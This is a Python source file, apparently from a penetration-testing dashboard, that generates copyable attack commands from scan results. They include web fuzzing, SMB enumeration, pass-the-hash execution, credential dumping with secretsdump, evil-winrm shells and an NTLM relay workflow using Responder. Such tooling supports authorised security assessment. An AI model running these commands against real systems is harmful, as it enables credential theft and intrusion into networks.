def empty_state(message: str) -> str:
    return f'<div class="empty">{h(message)}</div>'


def is_valid_web_url(url: str) -> bool:
    parsed = urllib.parse.urlparse(url)
    return parsed.scheme in {"http", "https"} and bool(parsed.netloc)


def web_url_link(url: str) -> str:
    if not is_valid_web_url(url):
        return h(url)
    return f'<a href="{h(url)}" target="_blank" rel="noreferrer">{h(url)}</a>'


def endpoint_size_label(endpoint: WebEndpoint) -> str:
    size = endpoint.content_length or endpoint.response_size
    if not size:
        return "-"
    return f"{int(size)} bytes"


def format_bytes(value: int) -> str:
    units = ["B", "KB", "MB", "GB"]
    size = float(max(0, value))
    for unit in units:
        if size < 1024 or unit == units[-1]:
            if unit == "B":
                return f"{int(size)} {unit}"
            return f"{size:.1f} {unit}"
        size /= 1024
    return f"{value} B"


def copy_commands_button(label: str, commands: Iterable[str], *, loop_multiple: bool = False) -> str:
    command_text = command_text_for_copy(commands, loop_multiple=loop_multiple)
    if not command_text:
        return ""
    command_id = command_dom_id(command_text)
    return (
        f'<button class="copy-btn" type="button" data-copy-target="{h(command_id)}">{h(label)}</button>'
        f'<textarea id="{h(command_id)}" class="copy-buffer" readonly>{h(command_text)}</textarea>'
    )


def command_text_for_copy(commands: Iterable[str], *, loop_multiple: bool = False) -> str:
    clean = dedupe_text(commands)
    if loop_multiple and len(clean) > 1:
        return shell_for_loop_for_commands(clean)
    return "\n".join(clean)


def shell_for_loop_for_commands(commands: list[str], log_file: str = "birdscan-commands-all.txt") -> str:
    targets = " ".join(shlex_quote(command) for command in commands)
    if not targets:
        return ""
    return f'for cmd in {targets}; do sh -c "$cmd"; done 2>&1 | tee -a {shlex_quote(log_file)}'


def fuzz_tool_buttons(
    url: str,
    custom_wordlist: str = "",
    thread_count: int = 1,
    tools: Iterable[str] = FUZZ_DASHBOARD_TOOLS,
) -> str:
    by_tool = selected_fuzz_commands_by_tool(url, custom_wordlist=custom_wordlist, thread_count=thread_count, tools=tools)
    buttons = [copy_commands_button(tool, commands, loop_multiple=True) for tool, commands in by_tool.items()]
    return '<span class="fuzz-buttons">' + "".join(buttons) + "</span>"


def global_fuzz_buttons(
    items: Iterable[WebEndpoint | WebRoot | str],
    custom_wordlist: str = "",
    thread_count: int = 1,
    tools: Iterable[str] = FUZZ_DASHBOARD_TOOLS,
) -> str:
    root_urls = root_urls_for_items(items)
    if len(root_urls) > 1:
        commands_by_tool = fuzz_loop_commands_by_tool(root_urls, custom_wordlist=custom_wordlist, thread_count=thread_count, tools=tools)
        buttons = [copy_commands_button(tool, commands) for tool, commands in commands_by_tool.items()]
        return '<div class="global-fuzz-actions">' + "".join(buttons) + "</div>"
    commands_by_tool: dict[str, list[str]] = {}
    for root_url in root_urls:
        for tool, commands in selected_fuzz_commands_by_tool(root_url, custom_wordlist=custom_wordlist, root_only=True, thread_count=thread_count, tools=tools).items():
            commands_by_tool.setdefault(tool, []).extend(commands)
    buttons = [copy_commands_button(tool, dedupe_text(commands), loop_multiple=True) for tool, commands in commands_by_tool.items()]
    return '<div class="global-fuzz-actions">' + "".join(buttons) + "</div>"


def root_urls_for_endpoints(endpoints: list[WebEndpoint]) -> list[str]:
    return root_urls_for_items(endpoints)


def root_urls_for_items(items: Iterable[WebEndpoint | WebRoot | str]) -> list[str]:
    roots: list[str] = []
    for item in items:
        if isinstance(item, WebRoot):
            url = item.url
        elif isinstance(item, WebEndpoint):
            url = item.url
        else:
            url = str(item)
        root = normalize_fuzz_root_url(url)
        if root:
            roots.append(root)
    return dedupe_text(roots)


def fuzz_commands_html(url: str, custom_wordlist: str = "") -> str:
    commands = fuzz_commands_for_url(url, custom_wordlist=custom_wordlist)
    if not commands:
        return ""
    return command_block_html("Comandos de fuzzing", commands)


def fuzz_commands_for_url(url: str, custom_wordlist: str = "") -> list[str]:
    commands: list[str] = []
    for tool_commands in fuzz_commands_by_tool(url, custom_wordlist=custom_wordlist).values():
        commands.extend(tool_commands)
    return dedupe_text(commands)


def selected_fuzz_commands_by_tool(
    url: str,
    custom_wordlist: str = "",
    root_only: bool = False,
    thread_count: int = 1,
    tools: Iterable[str] = FUZZ_DASHBOARD_TOOLS,
) -> dict[str, list[str]]:
    allowed = set(tools)
    return {
        tool: commands
        for tool, commands in fuzz_commands_by_tool(url, custom_wordlist=custom_wordlist, root_only=root_only, thread_count=thread_count).items()
        if tool in allowed
    }


def fuzz_loop_commands_by_tool(
    urls: Iterable[str],
    custom_wordlist: str = "",
    thread_count: int = 1,
    tools: Iterable[str] = FUZZ_DASHBOARD_TOOLS,
) -> dict[str, list[str]]:
    root_urls = root_urls_for_items(urls)
    if len(root_urls) <= 1:
        if not root_urls:
            return {}
        return selected_fuzz_commands_by_tool(root_urls[0], custom_wordlist=custom_wordlist, root_only=True, thread_count=thread_count, tools=tools)
    custom_wordlist = custom_wordlist or "/path/to/custom-wordlist.txt"
    gobuster_wordlist = custom_wordlist if custom_wordlist != "/path/to/custom-wordlist.txt" else DASHBOARD_BIG_WORDLIST
    thread_count = max(1, int(thread_count))
    target_values = " ".join(shlex_quote(root_url) for root_url in root_urls)
    candidates = {
        "Gobuster": (
            f'for url in {target_values}; do '
            f'gobuster dir -u "$url" -w {shlex_quote(gobuster_wordlist)} -k -t {thread_count} -e --no-error -r '
            f'-a Mozilla/5.0 --exclude-length 123456 -x {DASHBOARD_EXTENSIONS_CSV}; '
            "done 2>&1 | tee -a fuzzing-gobuster-all-web.txt"
        ),
        "Feroxbuster": (
            f'for url in {target_values}; do '
            f'feroxbuster --insecure --url "$url" --methods GET,POST -r -A -w {shlex_quote(DASHBOARD_BIG_WORDLIST)} '
            f'-x {DASHBOARD_EXTENSIONS_SPACE}; '
            "done 2>&1 | tee -a fuzzing-feroxbuster-all-web.txt"
        ),
        "Dirsearch": (
            f'for url in {target_values}; do '
            f'dirsearch -u "$url" --crawl --full-url -t {thread_count} --user-agent Mozilla/5.0 '
            f'-e {DASHBOARD_EXTENSIONS_CSV}; '
            "done 2>&1 | tee -a fuzzing-dirsearch-all-web.txt"
        ),
        "FFUF": (
            f'for url in {target_values}; do '
            f'ffuf -u "${{url%/}}/FUZZ" -w {shlex_quote(DASHBOARD_BIG_WORDLIST)} -c -t 100 -e {DASHBOARD_EXTENSIONS_DOT}; '
            "done 2>&1 | tee -a fuzzing-ffuf-all-web.txt"
        ),
        "Dirb": (
            f'for url in {target_values}; do '
            f'dirb "$url" {shlex_quote(DASHBOARD_SECLISTS_BIG_WORDLIST)} -a Mozilla/5.0 -X {DASHBOARD_EXTENSIONS_DOT}; '
            "done 2>&1 | tee -a fuzzing-dirb-all-web.txt"
        ),
    }
    allowed = set(tools)
    return {tool: [command] for tool, command in candidates.items() if tool in allowed}


def fuzz_commands_by_tool(url: str, custom_wordlist: str = "", root_only: bool = False, thread_count: int = 1) -> dict[str, list[str]]:
    base_url = normalize_fuzz_root_url(url) if root_only else normalize_fuzz_base_url(url)
    if not base_url:
        return {}
    slug = fuzz_slug_for_base_url(base_url)
    ffuf_url = base_url.rstrip("/") + "/FUZZ"
    custom_wordlist = custom_wordlist or "/path/to/custom-wordlist.txt"
    gobuster_wordlist = custom_wordlist if custom_wordlist != "/path/to/custom-wordlist.txt" else DASHBOARD_BIG_WORDLIST
    thread_count = max(1, int(thread_count))
    return {
        "Gobuster": [
            f"gobuster dir -u {shlex_quote(base_url)} -w {shlex_quote(gobuster_wordlist)} -k -t {thread_count} -e --no-error -r -o fuzz-gobuster-{slug}.txt -a Mozilla/5.0 --exclude-length 123456 -x {DASHBOARD_EXTENSIONS_CSV}",
        ],
        "Feroxbuster": [
            f"feroxbuster --insecure --url {shlex_quote(base_url)} --methods GET,POST -r -A -w {shlex_quote(DASHBOARD_BIG_WORDLIST)} -o fuzz-feroxbuster-{slug}.txt -x {DASHBOARD_EXTENSIONS_SPACE}",
        ],
        "Dirsearch": [
            f"dirsearch -u {shlex_quote(base_url)} --crawl --full-url -t {thread_count} --user-agent Mozilla/5.0 -e {DASHBOARD_EXTENSIONS_CSV} -o fuzz-dirsearch-{slug}.txt",
        ],
        "FFUF": [
            f"ffuf -u {shlex_quote(ffuf_url)} -w {shlex_quote(DASHBOARD_BIG_WORDLIST)} -c -t 100 -e {DASHBOARD_EXTENSIONS_DOT} -o output-{slug}.html -of html",
        ],
        "Dirb": [
            f"dirb {shlex_quote(base_url)} {shlex_quote(DASHBOARD_SECLISTS_BIG_WORDLIST)} -a Mozilla/5.0 -X {DASHBOARD_EXTENSIONS_DOT} -o dirb-{slug}.txt",
        ],
    }


def fuzz_slug_for_base_url(base_url: str) -> str:
    parsed_base = urllib.parse.urlparse(base_url)
    slug = safe_filename(f"{parsed_base.scheme}_{parsed_base.netloc}_{parsed_base.path.strip('/')}")
    return slug or "web"


def command_block_html(title: str, commands: list[str], *, open_by_default: bool = False) -> str:
    if not commands:
        return ""
    open_attr = " open" if open_by_default else ""
    rows = [f'<details class="command-details"{open_attr}><summary>{h(title)}</summary><div class="command-list">']
    display_commands = [command_text_for_copy(commands, loop_multiple=True)] if len(dedupe_text(commands)) > 1 else commands
    for command in display_commands:
        command_id = command_dom_id(command)
        rows.append(
            '<div class="command-row">'
            '<div class="command-row-head">'
            f'<span class="pill">{h(command_tool_name(command))}</span>'
            f'<button class="copy-btn" type="button" data-copy-target="{h(command_id)}">Copiar</button>'
            "</div>"
            f'<textarea id="{h(command_id)}" class="command-text" spellcheck="false">{h(command)}</textarea>'
            "</div>"
        )
    rows.append("</div></details>")
    return "\n".join(rows)


def command_dom_id(command: str) -> str:
    seed = f"{uuid.uuid4().hex}:{command}"
    digest = hashlib.sha1(seed.encode("utf-8", errors="ignore")).hexdigest()[:16]
    return f"cmd-{digest}"


def command_tool_name(command: str) -> str:
    if command.lstrip().startswith("while "):
        return "loop"
    if command.lstrip().startswith("for "):
        return "loop"
    return command.split(" ", 1)[0] if command.strip() else "command"


def copy_value_button(label: str, value: str) -> str:
    if not value:
        return ""
    return f'<button class="copy-btn" type="button" data-copy-value="{h(value)}">{h(label)}</button>'


def open_url_button(label: str, url: str) -> str:
    if not is_valid_web_url(url):
        return ""
    return f'<a class="copy-btn open-btn" href="{h(url)}" target="_blank" rel="noreferrer">{h(label)}</a>'


def service_interaction_buttons(service: ServiceRecord, state: ScanState) -> str:
    by_tool = service_primary_commands_by_tool(service, state)
    buttons: list[str] = []
    if service_group_name(service) == "WEB":
        buttons.append(open_url_button("Abrir", build_url(preferred_scheme_for_service(service), service.ip, service.port, "/")))
    
    for tool_label, cmds in by_tool.items():
        if not cmds:
            continue
        if tool_label == "AS-REP Roasting":
            all_commands = [cmd_text for _, cmd_text in cmds]
            buttons.append(copy_commands_button(f"AS-REP Roasting ({len(all_commands)})", all_commands))
            continue
        if len(cmds) == 1:
            cmd_label, cmd_text = cmds[0]
            buttons.append(copy_commands_button(tool_label, [cmd_text]))
        else:
            options = "".join(
                f'<div style="margin-bottom:4px">{copy_commands_button(command_action_label(cmd_label, cmd_text), [cmd_text])}</div>'
                for cmd_label, cmd_text in cmds
            )
            # Add a dropdown button for multiple commands
            buttons.append(
                f'<details class="inline-web-list" style="position:relative; display:inline-block; vertical-align:top; margin-right:6px;">'
                f'<summary class="copy-btn" style="padding:6px 9px; min-width:max-content;">{h(tool_label)} <span style="font-size:10px">({len(cmds)})▼</span></summary>'
                f'<div style="position:absolute; left:0; min-width:260px; max-width:calc(100vw - 40px); max-height:400px; overflow-y:auto; background:var(--panel-solid); border:1px solid var(--line-strong); box-shadow: 0 10px 25px rgba(0,0,0,0.8); padding:8px; border-radius:6px; z-index:9999; margin-top:4px;">{options}</div>'
                f'</details>'
            )
            
    return '<div class="copy-actions">' + "".join(buttons) + "</div>"


def command_action_label(label: str, command: str) -> str:
    if label and label.strip() != "-":
        return label
    tool = command_tool_name(command).lower()
    labels = {
        "nmap": "Executar Nmap",
        "nc": "Conectar com Netcat",
        "curl": "Consultar com cURL",
        "whatweb": "Identificar tecnologias",
        "ssh": "Conectar por SSH",
        "ftp": "Conectar por FTP",
        "lftp": "Listar via LFTP",
        "ldapsearch": "Consultar LDAP",
        "mysql": "Conectar ao MySQL",
        "psql": "Conectar ao PostgreSQL",
        "redis-cli": "Consultar Redis",
        "mongosh": "Conectar ao MongoDB",
        "evil-winrm": "Conectar ao WinRM",
        "xfreerdp": "Conectar ao RDP",
        "rdesktop": "Conectar ao RDP legado",
        "showmount": "Listar exports NFS",
        "rpcinfo": "Listar serviços RPC",
        "snmpwalk": "Executar SNMP walk",
        "vncviewer": "Conectar ao VNC",
        "telnet": "Conectar por Telnet",
        "swaks": "Testar SMTP",
        "openssl": "Inspecionar TLS",
        "dig": "Consultar DNS",
        "for": "Executar lista de comandos",
    }
    return labels.get(tool, f"Executar {command_tool_name(command)}")


def service_nmap_command(service: ServiceRecord) -> str:
    command = ["nmap"]
    if service.protocol == "udp":
        command.append("-sU")
    command.extend(["-Pn", "-sV", "--version-all", "--reason", "-p", str(service.port), service.ip])
    return shell_join(command)


def service_nmap_script_command(service: ServiceRecord) -> str:
    command = ["nmap"]
    if service.protocol == "udp":
        command.append("-sU")
    command.extend(["-Pn", "-sV", "--reason", "-p", str(service.port)])
    scripts = service_nmap_scripts(service)
    if scripts:
        command.extend(["--script", scripts])
    command.append(service.ip)
    return shell_join(command)


def service_nmap_scripts(service: ServiceRecord) -> str:
    group = service_group_name(service)
    service_name = (service.service or "").lower()
    descriptor = f"{service_name} {service.product.lower()} {service.version.lower()} {service.banner.lower()}"
    if group == "WEB":
        return "http-title,http-headers,http-server-header"
    if group == "SMB":
        return "smb-protocols,smb-security-mode,smb2-security-mode,smb-enum-shares"
    if group == "RDP":
        return "rdp-enum-encryption,rdp-ntlm-info"
    if group == "SSH":
        return "ssh2-enum-algos,ssh-hostkey"
    if group == "FTP":
        return "ftp-anon,ftp-syst"
    if group == "LDAP/AD":
        return "ldap-rootdse"
    if group == "KERBEROS":
        return "krb5-info"
    if group == "DATABASE/DATA":
        if service.port in MYSQL_PORTS or "mysql" in descriptor:
            return "mysql-info"
        if service.port in POSTGRES_PORTS or "postgres" in descriptor:
            return "pgsql-info"
        if service.port in MSSQL_PORTS or any(token in descriptor for token in ["ms-sql", "mssql", "sql server"]):
            return "ms-sql-info"
        if service.port in REDIS_PORTS or "redis" in descriptor:
            return "redis-info"
        if service.port in MONGO_PORTS or "mongo" in descriptor:
            return "mongodb-info"
        if service.port in ELASTIC_PORTS or "elastic" in descriptor:
            return "http-title,http-headers"
    if group == "WINRM":
        return "http-title,http-headers"
    if group == "NFS/RPC":
        return "nfs-showmount,nfs-ls,nfs-statfs"
    if group == "SNMP":
        return "snmp-info"
    if group == "VNC":
        return "vnc-info"
    if group == "CONTAINER":
        if service.port in DOCKER_PORTS or "docker" in descriptor:
            return "docker-version"
        return "http-title,http-headers"
    if group == "TELNET":
        return "telnet-encryption"
    if group == "MAIL":
        return "smtp-commands,smtp-ntlm-info" if "smtp" in descriptor or service.port in {25, 465, 587} else "banner"
    if group == "DNS":
        return "dns-nsid"
    return "banner"


def validated_smb_share_actions(
    state: ScanState,
    service: ServiceRecord,
) -> tuple[list[tuple[str, str]], list[tuple[str, str]]]:
    """Return only commands backed by a successful share-specific ``ls``.

    ``smbclient -L`` is discovery metadata, not an authorization proof.  The
    mapping phase records the exact share command after a successful tree
    connect and directory listing; exposing only those records keeps the UI
    from offering commands for shares that merely appeared in a browse list.
    """
    smbclient_actions: list[tuple[str, str]] = []
    mount_actions: list[tuple[str, str]] = []
    seen_commands: set[str] = set()
    seen_mount_commands: set[str] = set()
    credentials = smb_auth_credentials_for_service(state, service)
    for item in state.evidence:
        if (
            item.category != "smb"
            or item.ip != service.ip
            or item.port != service.port
            or not item.title.startswith("Acesso SMB por usuário —")
        ):
            continue
        credential_label = str(item.data.get("credential_label") or item.data.get("username") or "null session")
        shares = item.data.get("shares", [])
        if not isinstance(shares, list):
            continue
        for share in shares:
            if not isinstance(share, dict) or not share.get("listing_success"):
                continue
            share_name = str(share.get("name") or "").strip()
            if not share_name:
                continue
            permissions = share.get("permissions", [])
            permission_text = "/".join(str(value) for value in permissions) if isinstance(permissions, list) else str(permissions)
            label = f"{credential_label} — {share_name} [{permission_text or 'ACCESS'}]"
            command = str(share.get("interaction_command") or "").strip()
            if command and command not in seen_commands:
                seen_commands.add(command)
                smbclient_actions.append((label, command))
            mount_command = str(share.get("mount_command") or "").strip()
            if not mount_command:
                credential_id = str(item.data.get("credential_id") or "")
                username = str(item.data.get("username") or "")
                domain = str(item.data.get("domain") or "")
                method = normalize_auth_method(str(item.data.get("auth_method") or ""), username=username)
                credential = next(
                    (
                        candidate
                        for candidate in credentials
                        if (credential_id and credential_fingerprint(candidate) == credential_id)
                        or (
                            candidate.get("username", "") == username
                            and candidate.get("domain", "") == domain
                            and normalize_auth_method(candidate.get("method", ""), username=candidate.get("username", "")) == method
                        )
                    ),
                    None,
                )
                path = str(share.get("path") or "").strip()
                if not path:
                    mapping_root = str(item.data.get("mapping_root") or "").strip()
                    if mapping_root:
                        path = str(Path(mapping_root) / safe_filename(share_name))
                if credential and path:
                    mount_command = reusable_cifs_mount_command(
                        service.ip,
                        service.port,
                        share_name,
                        path,
                        credential,
                    )
            if mount_command and mount_command not in seen_mount_commands:
                seen_mount_commands.add(mount_command)
                mount_actions.append((f"{label} — montar novamente", mount_command))
    return smbclient_actions, mount_actions


def ntlm_relay_commands(ip: str) -> list[tuple[str, str]]:
    """Return the ordered, individually copyable NTLM relay workflow."""
    target = shlex_quote(ip)
    preparation = (
        "sudo sed -i '/^[[:space:]]*socks[45]/d' /etc/proxychains.conf\n"
        "echo 'socks4 127.0.0.1 1080' | sudo tee -a /etc/proxychains.conf > /dev/null\n"
        "sudo sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf\n"
        "sudo sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf\n"
        f"crackmapexec smb {target} --gen-relay-list relay.txt"
    )
    return [
        ("1. Preparar proxychains, Responder e relay.txt", preparation),
        (
            "2. Relay SMB com SOCKS",
            "impacket-ntlmrelayx -tf relay.txt -smb2support -of netntlm -socks -ip IP-ATACANTE",
        ),
        (
            "3. Relay LDAP com delegate-access",
            "impacket-ntlmrelayx -t ldap://<DOMAIN_CONTROLLER_IP> --delegate-access -smb2support",
        ),
        (
            "4. Relay LDAPS com delegate-access",
            "impacket-ntlmrelayx -t ldaps://<DOMAIN_CONTROLLER_IP> --delegate-access -smb2support",
        ),
        (
            "5. Relay HTTP para AD CS",
            "impacket-ntlmrelayx -t http://<AD_CS_SERVER_IP>/certsrv/certfnsh.asp -smb2support",
        ),
        ("6. Executar Responder na interface", "sudo responder -I eth0"),
        (
            "7. SMBExec via proxychains",
            f"proxychains impacket-smbexec -no-pass 'DOMAIN/USER'@{target}",
        ),
        (
            "8. PSExec via proxychains",
            f"proxychains impacket-psexec -no-pass 'DOMAIN/CapturedUser'@{target}",
        ),
        (
            "9. Validar autenticação local com NetExec",
            f"netexec smb {target} -u 'Usuario' -p 'QualquerCoisa' --local-auth",
        ),
    ]


def service_primary_commands_by_tool(service: ServiceRecord, state: ScanState) -> dict[str, list[tuple[str, str]]]:
    ip = service.ip
    port = service.port
    group = service_group_name(service)
    netcat = f"nc -nv {shlex_quote(ip)} {port}"
    commands: dict[str, list[tuple[str, str]]] = {
        "Nmap Versão": [("-", service_nmap_command(service))],
        "Nmap NSE": [("-", service_nmap_script_command(service))],
    }
    
    creds = detect_auth_credentials_from_evidence(state).get((ip, port), [])
    if group == "SMB":
        creds = smb_auth_credentials_for_service(state, service)
    
    if service.protocol == "tcp":
        commands["NetCat"] = [("-", netcat)]
    if group == "WEB":
        scheme = preferred_scheme_for_service(service)
        url = build_url(scheme, ip, port, "/")
        commands.update({
            "CURL": [("-", f"curl -k -i -L --max-time 10 -A Mozilla/5.0 {shlex_quote(url)}")],
            "WhatWeb": [("-", f"whatweb --no-errors {shlex_quote(url)}")],
        })
        return commands
    if group == "SMB":
        validated_smbclient_cmds, validated_mount_cmds = validated_smb_share_actions(state, service)
        nxc_cmds: list[tuple[str, str]] = []
        cme_cmds: list[tuple[str, str]] = []
        rpc_cmds: list[tuple[str, str]] = []
        smbclient_cmds: list[tuple[str, str]] = []
        impacket_cmds: list[tuple[str, str]] = []
        pth_cmds: list[tuple[str, str]] = []
        mount_cmds: list[tuple[str, str]] = []
        enum4linux_cmds: list[tuple[str, str]] = []

        if not creds:
            nxc_cmds.append(("Enumeração SMB sem credencial", f"nxc smb {shlex_quote(ip)} --port {port} --users --disks --shares"))
            cme_cmds.append(("Enumeração SMB sem credencial", f"crackmapexec smb {shlex_quote(ip)} --port {port} --users --disks --shares"))
            rpc_cmds.append(("RPC null session", f"rpcclient -U '%' -N {shlex_quote(ip)} -p {port} -c srvinfo"))
            smbclient_cmds.append(("Listar shares via null session", f"smbclient -L //{shlex_quote(ip)} -U '%' -N -p {port}"))
            impacket_cmds.append(("SMBClient sem senha", f"impacket-smbclient -port {port} -no-pass {shlex_quote(ip)}"))
            impacket_cmds.append(("RPCDump sem credencial", f"impacket-rpcdump -port {port} {shlex_quote(ip)}"))
        else:
            for cred in creds:
                u, p, m, label = cred["username"], cred["password"], cred["method"], cred["label"]
                domain = cred.get("domain", "")
                principal = f"{domain}/{u}" if domain else u
                mount_dir = f"/tmp/shares/smb-{ip}-{safe_filename(u or 'anonymous')}/SHARE"
                if m == "anonymous":
                    nxc_cmds.append(("Anonymous — shares", f"nxc smb {shlex_quote(ip)} --port {port} -u '' -p '' --shares"))
                    cme_cmds.append(("Anonymous — shares", f"crackmapexec smb {shlex_quote(ip)} --port {port} -u '' -p '' --shares"))
                    rpc_cmds.append(("Anonymous — RPC", f"rpcclient -U '%' -N {shlex_quote(ip)} -p {port} -c 'srvinfo;enumdomusers;enumdomgroups'"))
                    smbclient_cmds.append(("Anonymous — listar shares", f"smbclient -L //{shlex_quote(ip)} -U '%' -N -p {port}"))
                    impacket_cmds.append(("Anonymous — SMBClient", f"impacket-smbclient -port {port} -no-pass {shlex_quote(ip)}"))
                    enum4linux_cmds.append(("Anonymous — enumeração completa", f"enum4linux -a -A -d -u '' -p '' {shlex_quote(ip)}"))
                    mount_cmds.append(("Anonymous — montar SHARE", f"sudo mkdir -p {shlex_quote(mount_dir)} && sudo mount -t cifs //{shlex_quote(ip)}/SHARE {shlex_quote(mount_dir)} -o {shlex_quote(f'port={port},guest')}"))
                    continue

                auth_nxc = f" -u {shlex_quote(u)} -p {shlex_quote(p)}" if m == "password" else f" -u {shlex_quote(u)} -H {shlex_quote(p)}"
                if domain:
                    auth_nxc += f" -d {shlex_quote(domain)}"
                nxc_cmds.append((f"{label} — usuários, discos e shares", f"nxc smb {shlex_quote(ip)} --port {port} --users --disks --shares -x whoami{auth_nxc}"))
                cme_cmds.append((f"{label} — usuários, discos e shares", f"crackmapexec smb {shlex_quote(ip)} --port {port} --users --disks --shares -x whoami{auth_nxc}"))
                if m == "password":
                    rpc_cmds.append((f"{label} — RPC", f"rpcclient -U {shlex_quote(principal + '%' + p)} {shlex_quote(ip)} -p {port} -c 'srvinfo;enumdomusers;enumdomgroups'"))
                    smbclient_cmds.append((f"{label} — listar shares", f"smbclient -L //{shlex_quote(ip)} -U {shlex_quote(principal + '%' + p)} -p {port}"))
                    enum_parts = ["enum4linux", "-a", "-A", "-d"]
                    if domain:
                        enum_parts.extend(["-w", domain])
                    enum_parts.extend(["-u", u, "-p", p, ip])
                    enum4linux_cmds.append((f"{label} — enumeração completa", shell_join(enum_parts)))
                    imp_target = shlex_quote(f"{principal}:{p}@{ip}")
                    impacket_cmds.append((f"{label} — SMBClient", f"impacket-smbclient -port {port} {imp_target}"))
                    impacket_cmds.append((f"{label} — WMIExec (requer WMI/admin)", f"impacket-wmiexec {imp_target} whoami"))
                    impacket_cmds.append((f"{label} — PSExec (requer SCM/admin)", f"impacket-psexec -port {port} {imp_target}"))
                    impacket_cmds.append((f"{label} — SMBExec (requer admin)", f"impacket-smbexec -port {port} {imp_target}"))
                    impacket_cmds.append((f"{label} — ATExec (requer Task Scheduler)", f"impacket-atexec {imp_target} whoami"))
                    impacket_cmds.append((f"{label} — RPCDump", f"impacket-rpcdump -port {port} {imp_target}"))
                    if port == 445:
                        impacket_cmds.append((f"{label} — SecretsDump (requer admin/replicação)", f"impacket-secretsdump {imp_target}"))
                    mount_options = f"port={port},username={u}" + (f",domain={domain}" if domain else "")
                    mount_cmds.append((f"{label} — montar SHARE", f"sudo mkdir -p {shlex_quote(mount_dir)} && sudo env PASSWD={shlex_quote(p)} mount -t cifs //{shlex_quote(ip)}/SHARE {shlex_quote(mount_dir)} -o {shlex_quote(mount_options)}"))
                else:
                    normalized_hash = normalize_ntlm_hash(p)
                    nt_hash = nt_hash_component(p)
                    smbclient_cmds.append((f"{label} — listar shares com NT hash", f"smbclient -L //{shlex_quote(ip)} -p {port} -U {shlex_quote(principal)} --password {shlex_quote(nt_hash)} --pw-nt-hash"))
                    imp_target = shlex_quote(f"{principal}@{ip}")
                    imp_hash = f"-hashes {shlex_quote(normalized_hash)} {imp_target}"
                    impacket_cmds.append((f"{label} — SMBClient PTH", f"impacket-smbclient -port {port} {imp_hash}"))
                    impacket_cmds.append((f"{label} — WMIExec PTH (requer WMI/admin)", f"impacket-wmiexec {imp_hash} whoami"))
                    impacket_cmds.append((f"{label} — PSExec PTH (requer SCM/admin)", f"impacket-psexec -port {port} {imp_hash}"))
                    impacket_cmds.append((f"{label} — SMBExec PTH (requer admin)", f"impacket-smbexec -port {port} {imp_hash}"))
                    impacket_cmds.append((f"{label} — ATExec PTH", f"impacket-atexec {imp_hash} whoami"))
                    impacket_cmds.append((f"{label} — RPCDump PTH", f"impacket-rpcdump -port {port} {imp_hash}"))
                    if port == 445:
                        impacket_cmds.append((f"{label} — SecretsDump PTH (requer admin/replicação)", f"impacket-secretsdump {imp_hash}"))
                    pth_auth = shlex_quote(f"{principal}%{normalized_hash}")
                    pth_cmds.append((f"{label} — WMI query PTH (requer WMI/DCOM)", f"pth-wmic -U {pth_auth} //{shlex_quote(ip)} 'SELECT Name FROM Win32_UserAccount'"))
                    pth_cmds.append((f"{label} — RPCClient PTH", f"pth-rpcclient -U {pth_auth} -p {port} //{shlex_quote(ip)}"))
                    pth_cmds.append((f"{label} — WinExe PTH (requer admin)", f"pth-winexe -U {pth_auth} //{shlex_quote(ip)} cmd.exe"))

        # The SMBClient and Mount CIFS actions are authorization-backed only.
        # Keep the broader enumeration/execution helpers above for their
        # existing purposes, but never present -L or a placeholder SHARE as if
        # it were a usable share connection.
        commands.update({
            "Mount CIFS": validated_mount_cmds,
            "Enum4Linux": enum4linux_cmds,
            "SMBClient": validated_smbclient_cmds,
            "NXC": nxc_cmds,
            "CrackMapExec": cme_cmds,
            "RPCClient": rpc_cmds,
            "Impacket": impacket_cmds,
        })
        if pth_cmds:
            commands["Pass-the-Hash"] = pth_cmds
            
        # NTLM Relay workflow: the only eligibility condition is SMB signing=False.
        if host_has_smb_signing_false(state, ip):
            commands["NTLM Relay ⚠️"] = ntlm_relay_commands(ip)
            
        # Add WinRM commands if WinRM is available and creds exist
        if creds:
            winrm_ports = [s.port for s in state.services if s.ip == ip and (s.port in WINRM_PORTS or "winrm" in (s.service or "").lower() or "wsman" in (s.service or "").lower())]
            if winrm_ports:
                winrm_nxc = []
                winrm_evil = []
                for wp in winrm_ports:
                    for cred in creds:
                        u, p, m, label = cred["username"], cred["password"], cred["method"], cred["label"]
                        if m == "password":
                            winrm_nxc.append((label, f"nxc winrm {shlex_quote(ip)} --port {wp} -u {shlex_quote(u)} -p {shlex_quote(p)} -x whoami"))
                            winrm_evil.append((label, f"evil-winrm -i {shlex_quote(ip)} -u {shlex_quote(u)} -p {shlex_quote(p)}"))
                        else:
                            winrm_nxc.append((label, f"nxc winrm {shlex_quote(ip)} --port {wp} -u {shlex_quote(u)} -H {shlex_quote(p)} -x whoami"))
                            winrm_evil.append((label, f"evil-winrm -i {shlex_quote(ip)} -u {shlex_quote(u)} -H {shlex_quote(p)}"))
                if winrm_nxc:
                    commands["NXC WinRM"] = winrm_nxc
                if winrm_evil:
                    commands["Evil-WinRM"] = winrm_evil
            
        return commands
    if group == "RDP":
        xfreerdp_cmds = []
        nxc_cmds = []
        if not creds:
            xfreerdp_cmds.append(("-", f"xfreerdp /v:{ip}:{port} /cert-ignore /dynamic-resolution"))
            nxc_cmds.append(("-", f"nxc rdp {shlex_quote(ip)} --port {port} --screenshot"))
        else:
            for cred in creds:
                u, p, m, label = cred["username"], cred["password"], cred["method"], cred["label"]
                if m == "password":
                    xfreerdp_cmds.append((label, f"xfreerdp /v:{ip}:{port} /cert-ignore /dynamic-resolution /u:{shlex_quote(u)} /p:{shlex_quote(p)}"))
                    nxc_cmds.append((label, f"nxc rdp {shlex_quote(ip)} --port {port} -u {shlex_quote(u)} -p {shlex_quote(p)} --screenshot"))
                else:
                    xfreerdp_cmds.append((label, f"xfreerdp /v:{ip}:{port} /cert-ignore /dynamic-resolution /u:{shlex_quote(u)} /pth:{shlex_quote(p)}"))
                    nxc_cmds.append((label, f"nxc rdp {shlex_quote(ip)} --port {port} -u {shlex_quote(u)} -H {shlex_quote(p)} --screenshot"))

        commands.update({
            "XFreeRDP": xfreerdp_cmds,
            "RDesktop": [("-", f"rdesktop {ip}:{port}")],
            "NXC RDP": nxc_cmds,
        })
        return commands
    if group == "SSH":
        ssh_cmds = []
        if not creds:
            ssh_cmds.append(("-", f"ssh -p {port} user@{shlex_quote(ip)}"))
        else:
            for cred in creds:
                u, label = cred["username"], cred["label"]
                ssh_cmds.append((label, f"ssh -p {port} {shlex_quote(u)}@{shlex_quote(ip)}"))
        commands["SSH"] = ssh_cmds
        return commands
